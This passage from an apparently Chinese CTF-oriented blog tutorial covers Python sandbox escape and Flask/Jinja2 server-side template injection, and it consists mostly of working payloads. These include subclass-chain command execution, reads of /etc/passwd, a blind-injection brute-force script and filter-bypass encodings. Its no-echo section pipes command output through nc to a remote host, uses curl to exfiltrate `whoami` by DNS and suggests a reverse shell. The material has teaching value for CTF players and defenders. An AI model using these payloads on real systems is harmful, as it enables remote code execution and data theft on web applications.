class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.getwindowsversion&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;nt.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;nt.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteCodec&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteIncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteIncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteStreamReader&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteStreamWriter&#x27;</span>&gt;]</code></pre><p>这样不好查看，枚举一下：</p><p><img src="/2021/04/06/wei4/1.png" alt="1"></p><h3 id="沙盒逃逸原理"><a class="header-anchor" href="#沙盒逃逸原理">🍭</a>沙盒逃逸原理</h3><p><strong>沙盒/沙箱</strong></p><p>沙箱在早期主要用于测试可疑软件，测试病毒危害程度等等。在沙箱中运行，即使病毒对其造成了严重危害，也不会威胁到真实环境，沙箱重构也十分便捷。有点类似虚拟机的利用。</p><p>沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程</p><p>python类继承：</p><pre><code class="hljs awk">__base__ <span class="hljs-regexp">//</span>对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法__mro__ <span class="hljs-regexp">//</span>同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-<span class="hljs-number">1</span>]可以获取到__subclasses__() <span class="hljs-regexp">//</span>继承此对象的子类，返回一个列表</code></pre><p>可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类。</p><h3 id="payload"><a class="header-anchor" href="#payload">🍭</a>payload</h3><h4 id="python2"><a class="header-anchor" href="#python2">🍭</a>python2</h4><p>想要一个执行命令的payload只需要有os模块执行os.system即可：</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">num</span> = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> <span class="hljs-keyword">item</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__():    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">item</span>.__init__.__globals__:            print <span class="hljs-built_in">num</span>,<span class="hljs-keyword">item</span>        <span class="hljs-built_in">num</span>+=<span class="hljs-number">1</span>    except:        <span class="hljs-built_in">num</span>+=<span class="hljs-number">1</span><span class="hljs-comment">#72 &lt;class &#x27;site._Printer&#x27;&gt;</span><span class="hljs-comment">#77 &lt;class &#x27;site.Quitter&#x27;&gt;</span></code></pre><p>payload：</p><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()</code></pre><p>os模块还有从<code>warnings.catch*warnings</code>模块入手的，而这两个模块分别位于元组中的59，60号元素。<code>__init__</code>方法用于将对象实例化，在这个函数下我们可以通过<code>func\*globals</code>（或者<code>__globals**</code>）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。于是还可以挖掘到类似payload:</p><pre><code class="hljs sqf">[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>.values()[<span class="hljs-number">12</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre><h4 id="python3"><a class="header-anchor" href="#python3">🍭</a>python3</h4><p>python2下有file而在python3下已经没有了，所以是直接用open。python3的利用主要索引在于<code>__builtins__</code>，找到了它我们就可以利用其中的eval、open等等来执行我们想要的操作,大佬改编的一个递归脚本：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">obj, max_depth</span>):</span>    visited_clss = []    visited_objs = []    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit</span>(<span class="hljs-params">obj, path=<span class="hljs-string">&#x27;obj&#x27;</span>, depth=<span class="hljs-number">0</span></span>):</span>        <span class="hljs-keyword">yield</span> path, obj        <span class="hljs-keyword">if</span> depth == max_depth:            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">elif</span> isinstance(obj, type):            <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> visited_clss:                <span class="hljs-keyword">return</span>            visited_clss.append(obj)            <span class="hljs-comment">#print(obj) Enumerates the objects traversed</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> visited_objs:                <span class="hljs-keyword">return</span>            visited_objs.append(obj)        <span class="hljs-comment"># attributes</span>        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> dir(obj):            <span class="hljs-keyword">try</span>:                attr = getattr(obj, name)            <span class="hljs-keyword">except</span>:                <span class="hljs-keyword">continue</span>            <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(attr, <span class="hljs-string">&#x27;&#123;&#125;.&#123;&#125;&#x27;</span>.format(path, name), depth + <span class="hljs-number">1</span>)        <span class="hljs-comment"># dict values</span>        <span class="hljs-keyword">if</span> hasattr(obj, <span class="hljs-string">&#x27;items&#x27;</span>) <span class="hljs-keyword">and</span> callable(obj.items):            <span class="hljs-keyword">try</span>:                <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> obj.items():                    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(v, <span class="hljs-string">&#x27;&#123;&#125;[&#123;&#125;]&#x27;</span>.format(path, repr(k)), depth)            <span class="hljs-keyword">except</span>:                <span class="hljs-keyword">pass</span>        <span class="hljs-comment"># items</span>        <span class="hljs-keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):            <span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> enumerate(obj):                <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(v, <span class="hljs-string">&#x27;&#123;&#125;[&#123;&#125;]&#x27;</span>.format(path, repr(i)), depth)    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(obj)num = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__():    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> item.__init__.__globals__.keys():            <span class="hljs-keyword">for</span> path, obj <span class="hljs-keyword">in</span> search(item,<span class="hljs-number">5</span>):                <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;__builtins__&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>):                    print(<span class="hljs-string">&#x27;[+] &#x27;</span>,item,num,path)        num+=<span class="hljs-number">1</span>    <span class="hljs-keyword">except</span>:        num+=<span class="hljs-number">1</span></code></pre><p>另外pyhon执行命令的方式还有subprocess、command等等，控制递归深度，可以挖掘到更多payload。</p><h4 id="常用payload"><a class="header-anchor" href="#常用payload">🍭</a>常用payload</h4><h6 id="获取基本类"><a class="header-anchor" href="#获取基本类">🍭</a>获取基本类</h6><p><code>‘‘.__class__.__mro__[2]</code></p><p><code>&#123;&#125;.__class__.__bases__[0]</code></p><p><code>().__class__.__bases__[0]</code></p><p><code>[].__class__.__bases__[0]</code></p><p><code>request.__class__.__mro__[8]</code></p><h6 id="查看设置中的变量"><a class="header-anchor" href="#查看设置中的变量">🍭</a>查看设置中的变量</h6><p><code>&#123;  &#123; config &#125;  &#125;</code></p><p><code>&#123; &#123; url_for.__globals__[‘current_app‘].config[‘flag‘] &#125; &#125;</code></p><p><code>&#123; &#123; get_flashed_messages.__globals__[‘current_app‘].config[‘flag‘] &#125; &#125;</code></p><h6 id="查看模板中的变量-内容"><a class="header-anchor" href="#查看模板中的变量-内容">🍭</a>查看模板中的变量/内容</h6><p><code>&#123; &#123; self.__dict__ &#125; &#125;</code></p><h6 id="查看文件夹中的文件"><a class="header-anchor" href="#查看文件夹中的文件">🍭</a>查看文件夹中的文件</h6><p><code>&#123; &#123;‘‘.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[‘os‘].listdir(‘./‘)&#125; &#125;</code></p><h6 id="文件读取"><a class="header-anchor" href="#文件读取">🍭</a>文件读取</h6><p><code>‘‘.__class__.__mro__[-1].__subclasses__()[40](‘filename‘).read()</code></p><p>执行命令 <code>‘‘.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(‘ls‘).read()</code></p><h3 id="无回显处理"><a class="header-anchor" href="#无回显处理">🍭</a>无回显处理</h3><blockquote><p>nc转发</p><blockquote><pre><code class="hljs sqf">&gt;&gt;vps：nc -lvp <span class="hljs-number">44444</span>&gt;&gt;payload: <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls | nc xx.xxx.xx.xx 44444&#x27;</span>)</code></pre><p>也可以考虑直接反弹交互型shell</p></blockquote></blockquote><blockquote><p>dnslog转发</p><blockquote><pre><code class="hljs autohotkey">&gt;curl `whoami`.xxxxxx</code></pre><p>参考<a href="http://www.smartredirect.de/redir/clickGate.php?u=IgKHHLBT&amp;m=1&amp;p=8vZ5ugFkSx&amp;t=vHbSdnLT&amp;st=&amp;s=&amp;url=https%3A%2F%2Fwww.cnblogs.com%2Fafanti%2Fp%2F8047530.html&amp;r=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F188172%23h3-10">巧用DNSlog实现无回显注入</a><br>建立本地文件再读取<br>这个也很好理解，针对system无回显，直接执行<code>ls &gt; a.txt</code>，再用open进行读取</p></blockquote></blockquote><blockquote><p>curl上传文件</p><blockquote><p>参考：<a href="http://admintony.com/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html">无回显代码执行利用方法</a></p></blockquote></blockquote><blockquote><p>盲注<code>&#123; % if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' % &#125;~p0~&#123; % endif % &#125;</code>类似SQL布尔注入，通过是否回显<sub>p0</sub>来判断注入是否成功。找到脚本如下：</p><blockquote><pre><code class="hljs markdown">&gt;import requests&gt;url = &#x27;http://127.0.0.1:8080/&#x27;&gt;def check(payload):&gt;postdata = &#123;  &#x27;exploit&#x27;:payload  &#125;&gt;r = requests.post(url, data=postdata).content&gt;return &#x27;~p0~&#x27; in r&gt;password  = &#x27;&#x27;&gt;s = r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$&#x27;()<span class="hljs-emphasis">*+,-./:;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">=</span>&gt;</span></span>?@[\]^`&#123;|&#125;~&#x27;&quot;_%&#x27;</span><span class="hljs-emphasis"></span><span class="hljs-emphasis">&gt;for i in xrange(0,100):</span><span class="hljs-emphasis">&gt;for c in s:</span><span class="hljs-emphasis">  payload = &#x27;&#123; % if &quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&quot;/tmp/test&quot;</span>).read()[&#x27;+str(i)+&#x27;:&#x27;+str(i+1)+&#x27;] == &quot;&#x27;+c+&#x27;&quot; % &#125;~p0~&#123; % endif % &#125;&#x27;</span><span class="hljs-emphasis">  if check(payload):</span><span class="hljs-emphasis">      password += c</span><span class="hljs-emphasis">      break</span><span class="hljs-emphasis">&gt;print password</span></code></pre></blockquote></blockquote><h3 id="SSTI控制语句"><a class="header-anchor" href="#SSTI控制语句">🍭</a>SSTI控制语句</h3><p>做题的时候遇到SSTI，我们要知道一个python-web框架中哪些payload可用，一个一个发请求手动测试就太慢，这里就需要用模板的控制语句来写代码操作。</p><pre><code class="hljs clojure">&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__ == &#x27;catch_warnings&#x27; % &#125;  &#123; % for b in c.__init__.__globals__.values() % &#125;  &#123; % if b.__class__ == &#123;&#125;.__class__ % &#125;    &#123; % if &#x27;eval&#x27; in b.keys() % &#125;      &#123; &#123; b[&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;id&quot;</span>).read()&#x27;) &#125; &#125;    &#123; % endif % &#125;  &#123; % endif % &#125;  &#123; % endfor % &#125;&#123; % endif % &#125;&#123; % endfor % &#125;</code></pre><p>根据实际情况更改代码直接对题目环境测试</p><h3 id="Bypass"><a class="header-anchor" href="#Bypass">🍭</a>Bypass</h3><h5 id="拼接"><a class="header-anchor" href="#拼接">🍭</a>拼接</h5><pre><code class="hljs markdown">object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-strong">__dict__</span>[<span class="hljs-string">&#x27;o&#x27;+&#x27;s&#x27;</span>].<span class="hljs-strong">__dict__</span>[<span class="hljs-string">&#x27;sy&#x27;+&#x27;stem&#x27;</span>](<span class="hljs-link">&#x27;ls&#x27;</span>)</span><span class="hljs-emphasis">().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;r&#x27;,&#x27;fla&#x27;+&#x27;g.txt&#x27;</span>)).read()</span></code></pre><h5 id="编码"><a class="header-anchor" href="#编码">🍭</a>编码</h5><pre><code class="hljs markdown">().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-link">&quot;__import__(&#x27;os&#x27;</span>).popen(&#x27;ls&#x27;).read()&quot;)</code></pre><p>等价于</p><p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode('base64'))</code>(可以看出单双引号内的都可以编码)</p><p>同理还可以进行rot13、16进制编码等</p><h5 id="过滤class"><a class="header-anchor" href="#过滤class">🍭</a>过滤class</h5><p>使用session</p><pre><code class="hljs prolog">poc &#123; &#123;session[<span class="hljs-string">&#x27;__cla&#x27;</span>+<span class="hljs-string">&#x27;ss__&#x27;</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">118</span>]&#125; &#125;</code></pre><p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p><pre><code class="hljs clojure">&#123; &#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__mro__[<span class="hljs-number">12</span>]&#125; &#125;</code></pre><p>或者</p><pre><code class="hljs clojure">&#123; &#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__mro__[<span class="hljs-number">12</span>]&#125; &#125;</code></pre><h5 id="过滤中括号"><a class="header-anchor" href="#过滤中括号">🍭</a>过滤中括号[]</h5><p><strong>getitem()</strong></p><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">2</span>]<span class="hljs-string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>)</code></pre><p><strong>pop()</strong></p><pre><code class="hljs gcode"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__<span class="hljs-comment">(2)</span>.__subclasses__<span class="hljs-comment">()</span>.pop<span class="hljs-comment">(40)</span><span class="hljs-comment">(&#x27;/etc/passwd&#x27;)</span>.read<span class="hljs-comment">()</span></code></pre><p><strong>字典读取</strong></p><pre><code class="hljs python">__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>]()__builtins__.eval()</code></pre><p>经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行</p><h5 id="过滤引号"><a class="header-anchor" href="#过滤引号">🍭</a>过滤引号</h5><p>先获取chr函数，赋值给chr，后面拼接字符串</p><pre><code class="hljs hy">&#123; % set chr=().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.chr % &#125; &#123; &#123; ().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">100</span>)).read() &#125; &#125;</code></pre><p>或者借助request对象：（这种方法在沙盒种不行，在web下才行，因为需要传参）</p><pre><code class="hljs gcode">&#123; &#123; <span class="hljs-comment">()</span>.__class__.__bases__.__getitem__<span class="hljs-comment">(0)</span>.__subclasses__<span class="hljs-comment">()</span>.pop<span class="hljs-comment">(40)</span><span class="hljs-comment">(request.args.path)</span>.read<span class="hljs-comment">()</span> &#125; &#125;&amp;path=/etc/passwd</code></pre><p><strong>PS：将其中的request.args改为request.values则利用post的方式进行传参</strong></p><p>执行命令：</p><pre><code class="hljs reasonml">&#123; % set chr=<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr % &#125; &#123; &#123; <span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span>.pop(<span class="hljs-number">59</span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span></span>func_globals.linecache.os.popen(chr(<span class="hljs-number">105</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">100</span>)).read<span class="hljs-literal">()</span> &#125; &#125;&#123; &#123;<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span 